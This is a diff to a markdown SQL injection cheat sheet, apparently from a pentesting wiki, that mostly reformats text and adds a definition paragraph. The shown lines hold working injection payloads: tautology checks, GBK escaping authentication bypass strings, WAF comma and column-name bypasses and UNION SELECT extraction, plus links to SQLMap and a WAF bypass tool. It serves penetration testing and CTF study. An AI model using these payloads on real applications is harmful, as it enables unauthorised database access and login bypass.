@@ -1,5 +1,5 @@
 # SQL Injection
-
+SQL injection is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It generally allows an attacker to view data that they are not normally able to retrieve. This might include data belonging to other users, or any other data that the application itself is able to access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behaviour.
 
 ## Entry point detection
 the first thing you need to do is how to inject data in the query without breaking it. To do so you first need to find how to escape from the current context.
@@ -46,7 +46,7 @@ HQL does not support comments
 ```
 
 ## Confirming with logical operations
-> For example: if the GET parameter ?username=Peter returns the same content as ?username=Peter' or '1'='1 then, you found a SQL injection, OR If ?id=1 returns the same as ?id=2-1, SQLinjection.
+> For example: if the GET parameter ?username=Peter returns the same content as **?username=Peter' or '1'='1** then, you found a SQL injection, OR If **?id=1 returns the same as ?id=2-1**, SQLinjection.
 ```bash
 page.asp?id=1 or 1=1 -- true
 page.asp?id=1' or 1=1 -- true
@@ -1130,7 +1130,7 @@ Pass1234." and 1=0 union select "admin",sha("Pass1234.")#
 ```
 
 ## GBK Authentication Bypass
-IF ' is being scaped you can use %A8%27, and when ' gets scaped it will be created: 0xA80x5c0x27 (╘')
+IF ' is being scaped you can use `%A8%27`, and when **'** gets scaped it will be created: `0xA80x5c0x27 (╘')`
 ```bash
 %A8%27 OR 1=1;-- 2
 %8C%A8%27 OR 1=1-- 2
@@ -1204,7 +1204,7 @@ No Whitespace - bypass using parenthesis
 ```
 
 ### No commas bypass
-No Comma - bypass using OFFSET, FROM and JOIN
+No Comma - bypass using `OFFSET`, `FROM` and `JOIN`
 ```bash
 LIMIT 0,1         -> LIMIT 1 OFFSET 0
 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
@@ -1237,9 +1237,9 @@ Basically you can use the scientific notation in unexpected ways for the WAF to 
 ```
 
 ### Bypass Column Names Restriction
-First of all, notice that if the original query and the table where you want to extract the flag from have the same amount of columns you might just do: 0 UNION SELECT * FROM flag
+First of all, notice that if the original query and the table where you want to extract the flag from have the same amount of columns you might just do: `0 UNION SELECT * FROM flag`
 
-It’s possible to access the third column of a table without using its name using a query like the following: SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;, so in an sqlinjection this would looks like:
+It’s possible to access the third column of a table without using its name using a query like the following: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, so in an sqlinjection this would looks like:
 ```bash
 # This is an example with 3 columns that will extract the column number 3
 -1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
@@ -1251,9 +1251,9 @@ Or using a comma bypass:
 ```
 This trick was taken from [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)
 
-### [WAF bypass suggester tools](https://github.com/m4ll0k/Atlas)
 ## Tools
 * [SQLMap](https://github.com/sqlmapproject/sqlmap)
+* [WAF bypass suggester tools](https://github.com/m4ll0k/Atlas)
 
 ## Brute-Force Detection List
 ```bash
